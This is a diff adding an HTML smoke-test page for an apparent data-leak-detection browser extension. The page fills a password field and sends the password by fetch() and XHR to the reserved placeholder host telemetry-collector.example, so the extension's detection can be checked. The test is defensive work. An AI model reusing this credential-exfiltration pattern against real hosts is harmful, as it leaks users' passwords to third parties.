@@ -1,0 +1,61 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8" />
+<title>UNMASK smoke test</title>
+</head>
+<body>
+<h1>UNMASK Data X-Ray smoke test</h1>
+<form id="login-form">
+  <label for="pw">Password</label>
+  <input id="pw" name="password" type="password" autocomplete="current-password" />
+</form>
+<pre id="log"></pre>
+<script>
+  const SECRET_VALUE = 'CorrectHorseBatteryStaple123';
+  const log = (msg) => {
+    document.getElementById('log').textContent += msg + '\n';
+  };
+
+  async function run() {
+    const input = document.getElementById('pw');
+
+    // Simulate entry of a sensitive value the same way a real user or a
+    // password manager would: set .value and dispatch a real 'input' event.
+    input.value = SECRET_VALUE;
+    input.dispatchEvent(new Event('input', { bubbles: true }));
+    log('filled password field');
+
+    // Give the extension's debounce time to fingerprint the value.
+    await new Promise((r) => setTimeout(r, 800));
+
+    // Real fetch() carrying the value to a generic, non-resolving
+    // documentation-reserved domain (RFC 2606 .example) - not victim/attacker
+    // themed, just a generic "some third party" destination.
+    try {
+      await fetch('https://telemetry-collector.example/ingest', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ user: 'smoke-test', password: SECRET_VALUE })
+      });
+    } catch (e) {
+      log('fetch network error (expected, .example does not resolve): ' + e.message);
+    }
+
+    // Real XHR carrying the value too, to exercise the XHR vector.
+    await new Promise((resolve) => {
+      const xhr = new XMLHttpRequest();
+      xhr.open('POST', 'https://telemetry-collector.example/xhr-ingest');
+      xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+      xhr.onloadend = resolve;
+      xhr.onerror = resolve;
+      xhr.send('user=smoke-test&password=' + encodeURIComponent(SECRET_VALUE));
+    });
+
+    log('done - check backend /incidents for a matching event');
+  }
+
+  run();
+</script>
+</body>
+</html>
